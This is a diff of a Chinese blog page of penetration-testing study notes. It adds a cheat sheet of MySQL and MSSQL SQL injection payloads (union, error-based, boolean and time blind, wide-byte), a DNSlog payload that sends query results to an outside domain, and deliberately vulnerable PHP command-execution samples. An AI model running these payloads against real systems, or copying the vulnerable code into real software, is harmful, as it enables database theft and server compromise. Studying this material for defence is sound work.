@@ -151,20 +151,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-渗透测试总结 (@我要变超人  持续更新)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-渗透测试 (@我要变超人  持续更新)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">渗透测试总结 (@我要变超人  持续更新)</a>
+      <a class="article-title" href="/2020/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">渗透测试 (@我要变超人  持续更新)</a>
     </h1>
   
 
         
-        <a href="/2020/01/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/" class="archive-article-date">
-  	<time datetime="2020-01-17T09:08:40.294Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-17</time>
+        <a href="/2020/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/" class="archive-article-date">
+  	<time datetime="2020-01-26T04:09:53.872Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-26</time>
 </a>
         
       </header>
@@ -242,16 +242,196 @@
 </li>
 </ul>
 <p>Nmap主机发现<br>使用nmap命令：nmap.exe -sP CIDR   对该网络中所有主机进行ping扫描，探测主机存活性<br>CIDR指的是192.168.2.110/24  IP地址和子网掩码</p>
-<h3 id="子主题-2"><a href="#子主题-2" class="headerlink" title="子主题 2"></a>子主题 2</h3><h3 id="子主题-3"><a href="#子主题-3" class="headerlink" title="子主题 3"></a>子主题 3</h3><h3 id="子主题-4"><a href="#子主题-4" class="headerlink" title="子主题 4"></a>子主题 4</h3><h3 id="子主题-5"><a href="#子主题-5" class="headerlink" title="子主题 5"></a>子主题 5</h3><h3 id="子主题-6"><a href="#子主题-6" class="headerlink" title="子主题 6"></a>子主题 6</h3><h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h2 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h2><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="JS基础BOM"><a href="#JS基础BOM" class="headerlink" title="JS基础BOM"></a>JS基础BOM</h3><p>什么是BOM<br>浏览器对象模型（Browser Object Model）<br>由于现在浏览器已经（几乎）实现了 JavaScript 交互性方面的相同方法和属性，因此常被认为是BOM的方法和属性。</p>
+<h3 id="子主题-2"><a href="#子主题-2" class="headerlink" title="子主题 2"></a>子主题 2</h3><h3 id="子主题-3"><a href="#子主题-3" class="headerlink" title="子主题 3"></a>子主题 3</h3><h3 id="子主题-4"><a href="#子主题-4" class="headerlink" title="子主题 4"></a>子主题 4</h3><h3 id="子主题-5"><a href="#子主题-5" class="headerlink" title="子主题 5"></a>子主题 5</h3><h3 id="子主题-6"><a href="#子主题-6" class="headerlink" title="子主题 6"></a>子主题 6</h3><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><ul>
+<li><p>MySQL数据库（3306）</p>
 <ul>
-<li>例如：<br>window 对象<br>所有浏览器都支持 window 对象。他表示浏览器窗口。<br>所有JavaScript全局对象、函数以及变量均自动成为 window 对象的成员。<br>全局变量是 window 对象的属性。<br>全局函数是 window 对象的方法。<br>甚至 HTML DOM 的document 也是window 对象的属性之一：<br>window.document.getElementById(“header”);<br>与此相同：<br>document.getElementById(“header”);</li>
-<li>服务器端信息<ul>
+<li><p>判断是否存在注入，判断注入点类型1‘ and 1=1#<br>1’ and 1=2#<br>1’ and ‘1’=’1<br>1’ and ‘1’=’2<br>1’ or ‘1’ = ‘1<br>1’ or ‘1’ = ‘2</p>
+<ul>
+<li><p>union联合注入</p>
+<ul>
+<li>1.判断有多少列<ul>
+<li>1’ order by 10 –+</li>
+</ul>
+</li>
+<li>2.联合查询，判断回显位置<ul>
+<li>-1‘ union select 1,2,3 –+</li>
+</ul>
+</li>
+<li>3.根据回显点获取sql语句的执行结果(常见version,user,database)<ul>
+<li>-1’ union select 1,version(),user() –+</li>
+<li>若版本&gt;=5.x(4.x没有information_schema,)获取数据库的库表列信息<ul>
+<li>获取库名：-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+ </li>
+<li>获取表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”指定库名”–+</li>
+<li>获取列名：-1’ union select 1,group_concat(column_name) from information_schema.columns where  table_schema=”指定库名” and table_name=”指定表名”–+</li>
+<li>获取数据：-1’ union select 列名 from 库名.表名–+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>盲注之报错注入</p>
+<ul>
+<li><blockquote>
+<p>开启mysql_error()函数的情况下</p>
+</blockquote>
+<ul>
+<li><p>updatexml() MySQL5.1.5以上</p>
+<ul>
+<li>获取库名：1’ and (select updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit0,1),0x7e),3))–+</li>
+<li>获取表名：1’ and (select updatexml(1,concat(0x7e,(select table_name from information_schema.tables from table_schema=”指定库名”limit0,1),0x7e),3))–+</li>
+<li>获取列名：1’ and (select updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名”limit 0,1),0x7e),3))–+</li>
+<li>获取数据：1’ and (select updatexml(1,concat(0x7e,(select username from 库名.表名 limit 0,1),0x7e),3))–+</li>
+</ul>
+</li>
+<li><p>extractvalue() MySQL5.1以上</p>
+<ul>
+<li>获取库名：1’ and (select extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)))–+</li>
+<li>获取表名：1’ and (select extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=”指定库名” limit 0,1),0x7e)))–+</li>
+<li>获取列名：1’ and (select extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名” limit 0,1),0x7e)))–+</li>
+<li>获取数据：1’ and (select extractvalue(1,concat(0x7e,(select username from 库名.表名 limit 0,1),0x7e)))–+</li>
+</ul>
+</li>
+<li><p>floor()MySQL5.0以上</p>
+<ul>
+<li><blockquote>
+<p>count floor(rand)  group by  三个参数组成特殊结构在一起就报错</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>(select * from (select count(<em>) ,concat(user(),floor(rand(0)</em>2))x from xxx group by x)a) –+</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>xxx是一个任意存在的文件名</p>
+</blockquote>
+<ul>
+<li>获取库名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
+<li>获取表名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select table_name from information_schema.tables where table_schema=”指定库名” limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
+<li>获取列名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名” limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>盲注之布尔注入</p>
+<ul>
+<li><blockquote>
+<p>条件判断 </p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>if(1,2,3)  1是判断条件，2是条件为真的返回结果，3是条件为假的返回结果</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>语句：select if(1=1,’true’,’false’)   返回结果为true</p>
+</blockquote>
+</li>
+<li><blockquote>
+<pre><code>if(ascii(substr(查询语句,1,1)))=97,&apos;a&apos;,&apos;不是a&apos;）</code></pre></blockquote>
+<ul>
+<li>查询当前库名：先得到数据库名的长度<br>id=1’ and (length(database()))&gt;5 –+    若页面正常，则可判断当前数据库名称有5个字节<ul>
+<li>截取去码得到数据库的字符 改变n和m的值依次获取数据库名的字符 n表示起始位置，不能为0，m是对应的ASCII码值，具体值查看ASCII表<br>id=1’ and (ascii(substr(database(),n,1)))&gt;m –+  若页面正常，使用二分法判断第一个字符的ascii码值     land (ascii(substr(database(),n,1)))&gt;m –+</li>
+</ul>
+</li>
+<li>查询库名（先获取库名的数量，在获取库名长度）<br>id=1’ and (ascii(substr((select concat(schema_name) from information_schema.schemata limit 0,1),n,1)))&gt;m –+<br>一个个比对，使用burpsuit爆破</li>
+<li>查询表名（先获取表名的数量，在获取表名长度）<br>and (select count(*) from information_schema.tables where table_schema=database())&gt;5<br>and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5<br>and (ascii(substr((select table_name from information_schema.tables where table_schema=databsae() limit 0,1),1,1)))&gt;100</li>
+<li>获取列名（先获取列名个数，再获取列名长度，最后获取列名）<br>and (ascii(substr((select column_name from information_schema.column where table_name=’users’ limit 0,1),1,1)))&gt;100</li>
+<li>获取数据<br>and (ascii(substr((select password from users limit 0,1),1,1)))=68</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>盲注之时间注入</p>
+<ul>
+<li><blockquote>
+<p>sleep(arg1)  arg1表示中断的时间，单位为秒</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>语句：select if(1=1,sleep(3),’goodbye’)</p>
+</blockquote>
+<ul>
+<li>先得到数据库名的长度<br>and if((length(database())&gt;5),sleep(5),0)<br>and if((length(database())=4),sleep(5),0)<ul>
+<li>改变n和m的值一次获取数据库名的字符<br>and if((ascii(substr(databsae(),n,1)))&gt;m,sleep(5),0)</li>
+</ul>
+</li>
+<li>获取数据库表名（同理先获取长度）<br>and if((ascii(substr((select table_name from information_schema.tables where </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>+-table_schema=database() limit 0,1),1,1)))&gt;100,sleep(5),0)<br>            * 获取列名  ascii和substr与上面一条语句位置不同，但作用一样，都对<br>and if (select (ascii(substr(column_name,1,1))) from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)&gt;100,sleep(5),0)<br>            * 获取数据<br>and if((ascii(substr((select password from users limit 0,1),1,1)))=68,sleep(5),0)<br>        * 盲注之dnslog注入<br>            * 1‘’ and select load_file(concat(‘\\‘,(select hex(user())),’.dns域名\abc’))  原理同上，执行不同的语句获得结果<br>        * 二次编码注入<br>            * 二次编码注入产生的过程<br>用户输入?id=1%2527 —&gt;经过php自身编码变为?id=1%27—&gt;此时经过addslashes()函数，mysql_real_escape_string(),mysql_escape_string()函数，为发现<br>单引号等特殊字符，未触发转义，输出仍为?id=1%27 —&gt;如果此时程序中使用了urldecode或者rawurldecode函数来解码id参数，输出结果为?id=1’，产生单引<br>号成功闭合，从而引发注入。<br>斜杠/  绕过  %255c<br>双引号 绕过  %2522<br>        * 宽字节(GBK编码)注入<br>         * &gt; 宽字节注入 -常见函数<br>         * &gt; 浏览器客户端和服务器都可以指定操作数据的编码类型<br>         * &gt; addslashes()<br>         * &gt; mysql_real_escape_string()<br>         * &gt; mysql_escape_string()   php5.3以及之后就废除了</p>
+<pre><code>        * ?id=-1%df&apos; union select 1,(select user()),3 --+  这是由单引号被自动转义成\&apos;，前面的%df和转移字符\反斜杠（%5c）组成了%df%5c，也就是’運‘字，这时候单引号还在，于是成功闭合了前面的单引号
+* MySQL语法
+    * 增
+        *          增库：create database 数据库名；
+     增表：create table 表名 (列名1 VARCHAR(30), 列名2 VARCHAR(20), 列名3 VARCHAR(20) 。。。。。);
+    增列内容：insert into 表名 value（列1的值，列2的值，，，，）；
+    增加列：alter table 表名 add column 列名 varchar(30);
+    * 删
+        *  删库：drop database 库名；
+删表：drop table 表名；
+删列内容：delete from 表名 where 限定条件；#where限定是bool型的限定，true的会被执行
+DELETE from name where age &lt;15;
+    * 改
+        * 改列内容：UPDATE  表名  SET  字段名1=值1[,字段名2=值2，...]  [WHERE 条件表达式]
+    * 查
+        *     查库：show databases；
+查表：show tables；
+查列属性：show columns from 表名；desc 表名；
+查列内容：select * from 表名；</code></pre><ul>
+<li><p>MSSQL数据库（端口1433）</p>
+<ul>
+<li>判断是否存在注入点<ul>
+<li>判断是否为mssql数据库<br>?id=1 and exists(select * from sysobjects)–</li>
+<li>判断是否支持堆叠注入<br>?id=1;declare @a int–</li>
+<li>获取数据库版本<br>?id=1 and 1=@@version–</li>
+<li>查看数据看当前用户的数据库权限<br>?id=1 and 1=(select is_srvrolemember(‘sysadmin’))–</li>
+<li>查看数据看当前用户的数据库权限<br>?id=1 and 1=(select is_member(‘db_owner’))–</li>
+<li>查询当前使用的数据库<br>?id=1 and 1=(db_name())</li>
+<li>获取数据库个数<br>?id=1 and 1=(select quotename(count(name))from master..sysdatabases)–</li>
+<li>查看所有数据库的名字<br>?id=1 and 1=(select name from master.dbo.sysdatabases where dbid=1)–</li>
+<li>一次性获取所有数据库名<br>?id=1 and 1=(select quotename(name)from master..sysdatabasesFOR XML PATH(‘’))–</li>
+<li>一次性获取所有数据库表名<br>?id=2 and 1=(select top 1 name from blogdb..sysobjects where xtype=’U’ FOR XML PATH(‘’))–</li>
+<li>一次性获取所有数据库列名<br>?id=1 and 1=(select quotename(name)from 数据库名..syscolumns where id=(select id from 数据库名..sysobjects where name=’指定表名’)FOR XML PATH(‘’))–</li>
+<li>获取所有数据库数据<br>?id=1 and 1=(select top 1 * from blogdb..user_info where userid=1 FOR XML PATH(‘’))–</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ACCESS数据库(1521)</p>
+</li>
+<li><blockquote>
+<p>作为关系型数据库access和Mysql/mssql/Oracle等一样，都是库-&gt;表-&gt;列-&gt;内容，但是access的每一个库均为单独的一个文件。</p>
+</blockquote>
+<ul>
+<li>子主题 1<h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3></li>
+</ul>
+</li>
+<li><p>mongoDB</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="JS基础BOM"><a href="#JS基础BOM" class="headerlink" title="JS基础BOM"></a>JS基础BOM</h3><p>什么是BOM<br>浏览器对象模型（Browser Object Model）<br>由于现在浏览器已经（几乎）实现了 JavaScript 交互性方面的相同方法和属性，因此常被认为是BOM的方法和属性。</p>
+</li>
+<li><p>例如：<br>window 对象<br>所有浏览器都支持 window 对象。他表示浏览器窗口。<br>所有JavaScript全局对象、函数以及变量均自动成为 window 对象的成员。<br>全局变量是 window 对象的属性。<br>全局函数是 window 对象的方法。<br>甚至 HTML DOM 的document 也是window 对象的属性之一：<br>window.document.getElementById(“header”);<br>与此相同：<br>document.getElementById(“header”);</p>
+</li>
+<li><p>服务器端信息</p>
+<ul>
 <li>window location<br>window.location 对象在编写时可不使用 window这个前缀。<br>location.hostname  返回web主机的域名<br>location.pathname  返回当前页面的路径和文件名<br>location.port  返回web主机的端口<br>location.protocol   返回所使用的web协议 （http:或https:）<script>
 document.write(location.pathname);
 </script></li>
 </ul>
 </li>
-<li>浏览器信息<ul>
+<li><p>浏览器信息</p>
+<ul>
 <li>window navigator<br>window.navigator  对象包含有关访问者浏览器的信息。<script>
 txt = "<p>浏览器代号: " + navigator.appCodeName + "</p>";
 txt = "<p>浏览器名称: " + navigator.appName + "</p>";
@@ -264,80 +444,17 @@ document.write(txt);
 </script></li>
 </ul>
 </li>
-<li>cookie信息<ul>
+<li><p>cookie信息</p>
+<ul>
 <li>window document对象<br>document.cookie  对象用于存储web 页面的用户信息<br>使用document.cookie属性来创建、读取、删除cookie<br>创建cookie<br>document.cookie = “username = John Doe”;</li>
 </ul>
 </li>
 </ul>
 <p>读取cookie<br>document.write(document.cookie)</p>
 <p>删除cookie<br>document.cookie = “username = ; expires = Thu, 01 Jan 1970 00:00:00 GMT”;</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>web代码层命令执行<br>exec(“whoami”);<br>命令执行自动化工具：commix    kali自带<br>命令执行漏洞原理<br>命令执行漏洞定义： Web应用程序接收用户输入，拼接到要执行的系统命令中执行。</p>
-<ul>
-<li>0x01 产生原因：<br>1、用户输入为过滤或净化；<br>2、拼接到系统命令中执行。   </li>
-<li>0x02 PHP下命令执行函数<br>反撇号``   输出并返回shell结果<br>用法：echo <code>whoami</code>;</li>
-</ul>
-<p>system()  输出并返回最后一行shell结果<br>用法：system(‘whoami’)</p>
-<p>passthru()   只调用命令，把命令的运行结果原样的直接输出到标准输出设备上。相同点：都可以获得命令执行的状态码<br>用法：passthru(“whoami”)</p>
-<p>shell_exec()    通过shell环境执行命令，并且将完整的输出以字符串的方式返回<br>用法：shell_exec($_POST[‘system’]);</p>
-<p>exec()    不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面<br>用法：exec($_POST[‘system’],$output);print_r($output);<br>提示：某些情况下，要注意存在以上函数的php文件，有可能是webshell。</p>
-<ul>
-<li>0x03 命 令执行漏洞代码分析<br>echo”<pre>"  echo"</pre>“  按原格式输出<br>view-source:url地址            当Js禁止查看源代码时，可用此方式查看源代码（CTRL+U）<br>常见命令执行代码：<?php
-echo "please input get args cmd";
-echo "<pre>";
-if(isset($_GET["cmd"])){
-  system($_GET["cmd"]);
-}
-echo "</pre>";
-?>
-
-</li>
-</ul>
-<?php
-$id= $_GET['id'];
-eval("echo $id;");
-?>
-<p>127.0.0.1/6666.php?id=123;phpinfo()</p>
-<ul>
-<li>Windows<ul>
-<li>0x01  命令执行示例代码分析<?php
-echo"<pre>";
-$arg = $_GET['cmd'];
-if($arg){
-system("ping $arg");
-}
-echo"</pre>";
-?>
-
-</li>
-</ul>
-</li>
-</ul>
-<p>0x02  命令执行漏洞利用思路<br>代码中拼接用户的输入并代码system函数执行，但是无法直接执行用户的自定义命令。<br>思路：截断输入，重新拼接。两条命令都输入并执行。</p>
-<p>0x03  命令执行漏洞拼接符介绍<br>在Windows下的cmd命令中，有以下一些截断拼接符。<br>&amp;前面的语句为假则直接执行后面的<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>|直接执行后面的语句<br>||前面出错执行后面的</p>
-<ul>
-<li>Linux<ul>
-<li>0x01 命令执行示例代码分析<?php
-echo"<pre>";
-$arg = $_GET['cmd'];
-if($arg){
-system("ping -c 4 $arg");//-c 4  意思ping4次
-}
-echo"</pre>";
-?>
-
-</li>
-</ul>
-</li>
-</ul>
-<p>0x02  Kali linux测试环境搭建<br>启动apache服务，service apache2 start<br>代码拷贝到 /var/www/html/目录下的一个文件中</p>
-<p>0x03 命令执行漏洞拼接符介绍<br>在linux下的shell命令中，有以下一些截断拼接符。<br>在Linux上，上面的;也可以用|、||代替<br>    ;前面的执行完执行后面的<br>    &amp; 无论前面语句真假都会执行<br>    &amp;&amp; 只有前面语句为真，才能执行后面语句<br>    |时管道符，显示后面的执行结果<br>    ||当前面的执行出错时执行后面的   前面的成功执行的话就不执行第二个</p>
-<h3 id="第三方组件命令执行漏洞"><a href="#第三方组件命令执行漏洞" class="headerlink" title="第三方组件命令执行漏洞"></a>第三方组件命令执行漏洞</h3><p>wordpress中用来处理图片的imagemagic组件<br>Java中的命令注入漏洞（struts2/elasticsearchgroovy等）<br>vbulletin 5.x  版本通杀远程代码执行</p>
-<ul>
-<li>Thinkphp 5.x远程执行命令漏洞：<br><a href="https://www.cnblogs.com/backlion/p/10106676.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10106676.html</a><h3 id="系统层面命令执行漏洞"><a href="#系统层面命令执行漏洞" class="headerlink" title="系统层面命令执行漏洞"></a>系统层面命令执行漏洞</h3>MS08-067<br>bash破壳漏洞<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="什么是代码执行："><a href="#什么是代码执行：" class="headerlink" title="什么是代码执行："></a>什么是代码执行：</h3>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。<br>在php中：eval，assert，preg_replace（’/*/e’，’$ret=”\1”;’,$data）；<br>在asp中：eval，exevute.executeglobal<br>在jsp中：jsp中没有php中的eval函数，但是可以使用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpEL，MVEL等<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
 <p>包含的文件中如果有php，asp语句可被执行</p>
 </blockquote>
-</li>
-</ul>
 <h3 id="文件包含漏洞原理介绍"><a href="#文件包含漏洞原理介绍" class="headerlink" title="文件包含漏洞原理介绍"></a>文件包含漏洞原理介绍</h3><p>通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
 <ul>
 <li>文件包含漏洞的形成，需要满足两个条件：</li>
@@ -519,186 +636,72 @@ echo"</pre>";
 </ul>
 </li>
 <li><p>重绘图</p>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3></li>
-<li><p>MySQL数据库（3306）</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>web代码层命令执行<br>exec(“whoami”);<br>命令执行自动化工具：commix    kali自带<br>命令执行漏洞原理<br>命令执行漏洞定义： Web应用程序接收用户输入，拼接到要执行的系统命令中执行。</p>
+</li>
+<li><p>0x01 产生原因：<br>1、用户输入为过滤或净化；<br>2、拼接到系统命令中执行。   </p>
+</li>
+<li><p>0x02 PHP下命令执行函数<br>反撇号``   输出并返回shell结果<br>用法：echo <code>whoami</code>;</p>
+</li>
+</ul>
+<p>system()  输出并返回最后一行shell结果<br>用法：system(‘whoami’)</p>
+<p>passthru()   只调用命令，把命令的运行结果原样的直接输出到标准输出设备上。相同点：都可以获得命令执行的状态码<br>用法：passthru(“whoami”)</p>
+<p>shell_exec()    通过shell环境执行命令，并且将完整的输出以字符串的方式返回<br>用法：shell_exec($_POST[‘system’]);</p>
+<p>exec()    不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面<br>用法：exec($_POST[‘system’],$output);print_r($output);<br>提示：某些情况下，要注意存在以上函数的php文件，有可能是webshell。</p>
 <ul>
-<li><p>判断是否存在注入，判断注入点类型1‘ and 1=1#<br>1’ and 1=2#<br>1’ and ‘1’=’1<br>1’ and ‘1’=’2<br>1’ or ‘1’ = ‘1<br>1’ or ‘1’ = ‘2</p>
+<li>0x03 命 令执行漏洞代码分析<br>echo”<pre>"  echo"</pre>“  按原格式输出<br>view-source:url地址            当Js禁止查看源代码时，可用此方式查看源代码（CTRL+U）<br>常见命令执行代码：<?php
+echo "please input get args cmd";
+echo "<pre>";
+if(isset($_GET["cmd"])){
+  system($_GET["cmd"]);
+}
+echo "</pre>";
+?>
+
+</li>
+</ul>
+<?php
+$id= $_GET['id'];
+eval("echo $id;");
+?>
+<p>127.0.0.1/6666.php?id=123;phpinfo()</p>
 <ul>
-<li><p>union联合注入</p>
+<li>Windows<ul>
+<li>0x01  命令执行示例代码分析<?php
+echo"<pre>";
+$arg = $_GET['cmd'];
+if($arg){
+system("ping $arg");
+}
+echo"</pre>";
+?>
+
+</li>
+</ul>
+</li>
+</ul>
+<p>0x02  命令执行漏洞利用思路<br>代码中拼接用户的输入并代码system函数执行，但是无法直接执行用户的自定义命令。<br>思路：截断输入，重新拼接。两条命令都输入并执行。</p>
+<p>0x03  命令执行漏洞拼接符介绍<br>在Windows下的cmd命令中，有以下一些截断拼接符。<br>&amp;前面的语句为假则直接执行后面的<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>|直接执行后面的语句<br>||前面出错执行后面的</p>
 <ul>
-<li>1.判断有多少列<ul>
-<li>1’ order by 10 –+</li>
-</ul>
-</li>
-<li>2.联合查询，判断回显位置<ul>
-<li>-1‘ union select 1,2,3 –+</li>
-</ul>
-</li>
-<li>3.根据回显点获取sql语句的执行结果(常见version,user,database)<ul>
-<li>-1’ union select 1,version(),user() –+</li>
-<li>若版本&gt;=5.x(4.x没有information_schema,)获取数据库的库表列信息<ul>
-<li>获取库名：-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+ </li>
-<li>获取表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”指定库名”–+</li>
-<li>获取列名：-1’ union select 1,group_concat(column_name) from information_schema.columns where  table_schema=”指定库名” and table_name=”指定表名”–+</li>
-<li>获取数据：-1’ union select 列名 from 库名.表名–+</li>
-</ul>
+<li>Linux<ul>
+<li>0x01 命令执行示例代码分析<?php
+echo"<pre>";
+$arg = $_GET['cmd'];
+if($arg){
+system("ping -c 4 $arg");//-c 4  意思ping4次
+}
+echo"</pre>";
+?>
+
 </li>
 </ul>
 </li>
 </ul>
-</li>
-<li><p>盲注之报错注入</p>
+<p>0x02  Kali linux测试环境搭建<br>启动apache服务，service apache2 start<br>代码拷贝到 /var/www/html/目录下的一个文件中</p>
+<p>0x03 命令执行漏洞拼接符介绍<br>在linux下的shell命令中，有以下一些截断拼接符。<br>在Linux上，上面的;也可以用|、||代替<br>    ;前面的执行完执行后面的<br>    &amp; 无论前面语句真假都会执行<br>    &amp;&amp; 只有前面语句为真，才能执行后面语句<br>    |时管道符，显示后面的执行结果<br>    ||当前面的执行出错时执行后面的   前面的成功执行的话就不执行第二个</p>
+<h3 id="第三方组件命令执行漏洞"><a href="#第三方组件命令执行漏洞" class="headerlink" title="第三方组件命令执行漏洞"></a>第三方组件命令执行漏洞</h3><p>wordpress中用来处理图片的imagemagic组件<br>Java中的命令注入漏洞（struts2/elasticsearchgroovy等）<br>vbulletin 5.x  版本通杀远程代码执行</p>
 <ul>
-<li><blockquote>
-<p>开启mysql_error()函数的情况下</p>
-</blockquote>
-<ul>
-<li><p>updatexml() MySQL5.1.5以上</p>
-<ul>
-<li>获取库名：1’ and (select updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit0,1),0x7e),3))–+</li>
-<li>获取表名：1’ and (select updatexml(1,concat(0x7e,(select table_name from information_schema.tables from table_schema=”指定库名”limit0,1),0x7e),3))–+</li>
-<li>获取列名：1’ and (select updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名”limit 0,1),0x7e),3))–+</li>
-<li>获取数据：1’ and (select updatexml(1,concat(0x7e,(select username from 库名.表名 limit 0,1),0x7e),3))–+</li>
-</ul>
-</li>
-<li><p>extractvalue() MySQL5.1以上</p>
-<ul>
-<li>获取库名：1’ and (select extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)))–+</li>
-<li>获取表名：1’ and (select extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=”指定库名” limit 0,1),0x7e)))–+</li>
-<li>获取列名：1’ and (select extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名” limit 0,1),0x7e)))–+</li>
-<li>获取数据：1’ and (select extractvalue(1,concat(0x7e,(select username from 库名.表名 limit 0,1),0x7e)))–+</li>
-</ul>
-</li>
-<li><p>floor()MySQL5.0以上</p>
-<ul>
-<li><blockquote>
-<p>count floor(rand)  group by  三个参数组成特殊结构在一起就报错</p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>(select * from (select count(<em>) ,concat(user(),floor(rand(0)</em>2))x from xxx group by x)a) –+</p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>xxx是一个任意存在的文件名</p>
-</blockquote>
-<ul>
